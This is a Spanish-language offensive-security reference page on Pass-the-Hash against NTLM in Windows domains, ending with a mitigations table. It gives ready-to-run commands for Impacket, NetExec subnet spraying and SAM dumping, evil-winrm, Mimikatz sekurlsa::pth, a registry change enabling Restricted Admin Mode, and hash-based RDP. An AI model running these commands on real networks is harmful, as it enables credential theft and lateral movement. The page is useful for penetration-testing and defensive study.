# Pass-the-Hash (PtH)

Pass-the-Hash es una técnica de autenticación que explota una característica fundamental de NTLM: el protocolo no requiere que el cliente demuestre conocer la contraseña en texto claro, sino que demuestre poseer el hash NT. Esto significa que un hash NT extraído de SAM, LSASS o NTDS.dit puede usarse directamente para autenticarse en cualquier servicio que acepte NTLM, sin necesidad de cracking previo.

> PtH es posible porque NTLM usa el hash como derivación de la clave de sesión. El protocolo fue diseñado antes de que este tipo de ataque fuera considerado en el modelo de amenazas.

### Requisitos

* Hash NT de la cuenta objetivo (formato `aad3b435b51404eeaad3b435b51404ee:HASH_NT` — la parte LM puede ser cualquier valor o el hash vacío)
* El servicio objetivo debe aceptar autenticación NTLM (SMB, WMI, WinRM, RDP con NLA desactivado)
* La cuenta debe tener los permisos necesarios en el servicio destino

> PtH no funciona contra Kerberos. Solo es aplicable a servicios que usen NTLM. En dominios modernos con Kerberos como protocolo preferido, PtH sigue funcionando cuando el cliente se conecta por IP en lugar de nombre, o cuando el servicio no tiene SPN registrado.

### Impacket — psexec, smbexec, wmiexec

```bash
# PsExec-style — obtiene SYSTEM en el host remoto
impacket-psexec -hashes :64f12cddaa88057e06a81b54e73b949b EMPRESA/jsmith@192.168.1.20

# SMBExec — más silencioso, no sube binarios
impacket-smbexec -hashes :64f12cddaa88057e06a81b54e73b949b EMPRESA/jsmith@192.168.1.20

# WMIExec — usa WMI, genera menos eventos
impacket-wmiexec -hashes :64f12cddaa88057e06a81b54e73b949b EMPRESA/jsmith@192.168.1.20
```

### NetExec / CrackMapExec

```bash
# Verificar autenticación con hash en toda la subred
netexec smb 192.168.1.0/24 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b

# Ejecutar comando
netexec smb 192.168.1.20 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b -x "whoami"

# Extraer SAM del sistema remoto usando PtH
netexec smb 192.168.1.20 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b --sam

# WinRM
netexec winrm 192.168.1.20 -u jsmith -H 64f12cddaa88057e06a81b54e73b949b

# Evil-WinRM
evil-winrm -i 192.168.1.20 -u jsmith -H 64f12cddaa88057e06a81b54e73b949b
```

### Mimikatz — sekurlsa::pth

Desde un host Windows comprometido, Mimikatz puede iniciar un proceso autenticado con el hash directamente:

```
sekurlsa::pth /user:jsmith /domain:EMPRESA /ntlm:64f12cddaa88057e06a81b54e73b949b /run:cmd.exe
```

Esto abre un `cmd.exe` cuyo token de seguridad está cargado con el material del hash, permitiendo usar comandos de red (`net use`, `dir \\host\share`, etc.) autenticados como `jsmith`.

### RDP con Restricted Admin Mode

Por defecto RDP con NLA requiere la contraseña en texto claro. Sin embargo, si **Restricted Admin Mode** está habilitado en el host destino, es posible conectarse usando solo el hash:

```bash
# Habilitar Restricted Admin Mode en el objetivo (requiere acceso previo)
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0

# Conectar via RDP con xfreerdp usando hash
xfreerdp /v:192.168.1.20 /u:jsmith /pth:64f12cddaa88057e06a81b54e73b949b /d:EMPRESA
```

### Hash de administrador local — movimiento horizontal masivo

Un escenario muy común en entornos corporativos mal configurados: el mismo hash de administrador local está presente en decenas o cientos de máquinas (porque se desplegaron con la misma imagen sin LAPS). Comprometer un host permite moverse a toda la flota:

```bash
# Verificar en qué hosts el hash del admin local funciona
netexec smb 192.168.1.0/24 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b --local-auth

# El flag --local-auth indica que es una cuenta local, no de dominio
```

> LAPS (Local Administrator Password Solution) es precisamente la contramedida a este escenario: genera contraseñas únicas por host para el administrador local. Si LAPS está desplegado, este vector de movimiento horizontal queda bloqueado.

### Mitigaciones

| Mitigación                  | Efecto                                                     |
| --------------------------- | ---------------------------------------------------------- |
| **Credential Guard**        | Los hashes NTLM no están accesibles en LSASS               |
| **LAPS**                    | Contraseñas de admin local únicas por host                 |
| **Protected Users group**   | Fuerza Kerberos, deshabilita NTLM para los miembros        |
| **SMB signing obligatorio** | No mitiga PtH pero bloquea NTLMRelay                       |
| **Deshabilitar NTLM**       | Elimina el vector completamente, pero rompe compatibilidad |
